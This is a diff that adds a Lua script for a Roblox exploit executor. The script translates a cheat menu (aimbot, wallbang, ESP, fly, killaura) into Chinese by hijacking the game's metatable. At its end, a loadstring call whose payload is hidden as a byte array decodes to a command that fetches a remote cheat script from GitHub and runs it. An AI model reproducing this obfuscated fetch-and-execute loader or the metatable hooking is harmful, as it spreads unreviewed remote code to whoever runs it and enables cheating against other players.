@@ -1,0 +1,206 @@
+local Translations = {
+   --["这里填要替换的英文"] = "这里填中文",
+    ["Combat"] = "战斗",
+    ["Blatant"] = "一些自带的通用脚本",
+    ["Render"] = "主要功能",
+    ["Utility"] = "效用",
+    ["World"] = "世界",
+    ["Inventory"] = "库存",
+    ["Minigames"] = "迷你游戏",
+    ["Friends"] = "朋友",
+    ["Profiles"] = "轮廓",
+    ["Targets"] = "目标",
+    ["Arrows"] = "箭头",
+    ["Chams"] = "透视材质",
+    ["ESP"] = "ESP透视",
+    ["GamingChat"] = "游戏聊天",
+    ["Health"] = "生命值",
+    ["NameTags"] = "名称标签", 
+    ["PlayerModel"] = "玩家模型",
+    ["Search"] = "搜索",
+    ["Tracers"] = "追踪线",
+    ["Waypoints"] = "路径点",
+    ["AntiFall"] = "防坠落",
+    ["Fly"] = "飞行",
+    ["HighJump"] = "高跳",
+    ["HitBoxes"] = "命中框",
+    ["Invisible"] = "隐身",
+    ["Killaura"] = "杀戮光环", 
+    ["LongJump"] = "远跳",
+    ["MouseTP"] = "鼠标传送",
+    ["Phase"] = "穿墙",
+    ["Speed"] = "速度",
+    ["Spider"] = "蜘蛛爬墙",
+    ["SpinBot"] = "旋转机器人",
+    ["Swim"] = "游泳",
+    ["TargetStrafe"] = "目标环绕",
+    ["AnimationPlayer"] = "动画播放器",
+    ["AntiRagdoll"] = "防布娃娃效果",
+    ["AutoRejoin"] = "自动重连",
+    ["Blink"] = "闪烁",
+    ["ChatSpammer"] = "聊天刷屏",
+    ["Disabler"] = "禁用器",
+    ["Panic"] = "紧急模式",
+    ["Rejoin"] = "重新加入",
+    ["ServerHop"] = "服务器切换",
+    ["StaffDetector"] = "管理员检测",
+    ["Anti-AFK"] = "防挂机",
+    ["Freecam"] = "自由视角",
+    ["Gravity"] = "重力",
+    ["Parkour"] = "跑酷",
+    ["SafeWalk"] = "安全行走",
+    ["Xray"] = "X射线透视",
+    ["AimAssist"] = "瞄准辅助",
+    ["AutoClicker"] = "自动点击器",
+    ["Reach"] = "攻击距离",
+    ["SilentAim"] = "子追",
+    ["TriggerBot"] = "触发机器人",
+    ["Target:"] = "目标:",
+    ["Ignore none"] = "不忽略任何目标",
+    ["Mode"] = "模式",
+    ["Method"] = "方法",
+    ["Raycast Type"] = "射线类型",
+    ["Ignored Scripts"] = "忽略的脚本",
+    ["None"] = "无",
+    ["Range"] = "范围",
+    ["studs"] = "单位",
+    ["Hit Chance"] = "命中几率",
+    ["Headshot Chance"] = "爆头几率", 
+    ["AutoFire"] = "自动开火",
+    ["Next Shot Delay"] = "下次射击延迟",
+    ["seconds"] = "秒",
+    ["Origin"] = "原点",
+    ["Offset"] = "偏移量",
+    ["Wallbang"] = "穿墙射击",
+    ["Range Circle"] = "范围圆圈",
+    ["Projectile"] = "抛射物",
+    ["TriggerBot"] = "触发机器人",
+    ["TouchInterest"] = "触摸兴趣点",
+    ["Resize"] = "调整大小",
+    ["Chance"] = "几率",
+    ["Mouse Position"] = "鼠标位置",
+    ["Ray"] = "射线",
+    ["FindPartOnRay"] = "查找射线上的部件",
+    ["FindPartOnRayWithIgnoreList"] = "带忽略列表的射线查找",
+    ["FindPartOnRayWithWhitelist"] = "带白名单的射线查找",
+    ["ScreenPointToRay"] = "屏幕点转射线",
+    ["ViewportPointToRay"] = "视口点转射线",
+    ["Raycast"] = "射线投射"
+}
+
+local function translateText(text)
+    if not text or type(text) ~= "string" then return text end
+    
+    if Translations[text] then
+        return Translations[text]
+    end
+    
+    for en, cn in pairs(Translations) do
+        if text:find(en) then
+            return text:gsub(en, cn)
+        end
+    end
+    
+    return text
+end
+
+local function setupTranslationEngine()
+    local success, err = pcall(function()
+        local oldIndex = getrawmetatable(game).__newindex
+        setreadonly(getrawmetatable(game), false)
+        
+        getrawmetatable(game).__newindex = newcclosure(function(t, k, v)
+            if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then
+                v = translateText(tostring(v))
+            end
+            return oldIndex(t, k, v)
+        end)
+        
+        setreadonly(getrawmetatable(game), true)
+    end)
+    
+    if not success then
+        warn("元表劫持失败:", err)
+       
+        local translated = {}
+        local function scanAndTranslate()
+            for _, gui in ipairs(game:GetService("CoreGui"):GetDescendants()) do
+                if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                    pcall(function()
+                        local text = gui.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                gui.Text = translatedText
+                                translated[gui] = true
+                            end
+                        end
+                    end)
+                end
+            end
+            
+            local player = game:GetService("Players").LocalPlayer
+            if player and player:FindFirstChild("PlayerGui") then
+                for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
+                    if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                        pcall(function()
+                            local text = gui.Text
+                            if text and text ~= "" then
+                                local translatedText = translateText(text)
+                                if translatedText ~= text then
+                                    gui.Text = translatedText
+                                    translated[gui] = true
+                                end
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+        
+        local function setupDescendantListener(parent)
+            parent.DescendantAdded:Connect(function(descendant)
+                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
+                    task.wait(0.1)
+                    pcall(function()
+                        local text = descendant.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                descendant.Text = translatedText
+                            end
+                        end
+                    end)
+                end
+            end)
+        end
+        
+        pcall(setupDescendantListener, game:GetService("CoreGui"))
+        local player = game:GetService("Players").LocalPlayer
+        if player and player:FindFirstChild("PlayerGui") then
+            pcall(setupDescendantListener, player.PlayerGui)
+        end
+        
+        while true do
+            scanAndTranslate()
+            task.wait(3)
+        end
+    end
+end
+
+task.wait(2)
+
+setupTranslationEngine()
+
+local success, err = pcall(function()
+--这下面填加载外部脚本
+loadstring(utf8.char(table.unpack({
+108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,55,71,114,97,110,100,68,97,100,80,71,78,47,86,97,112,101,86,52,70,111,114,82,111,98,108,111,120,47,109,97,105,110,47,78,101,119,77,97,105,110,83,99,114,105,112,116,46,108,117,97,34,44,32,116,114,117,101,41,41,40,41
+})))()
+
+
+end)
+
+if not success then
+    warn("加载失败:", err)
+end
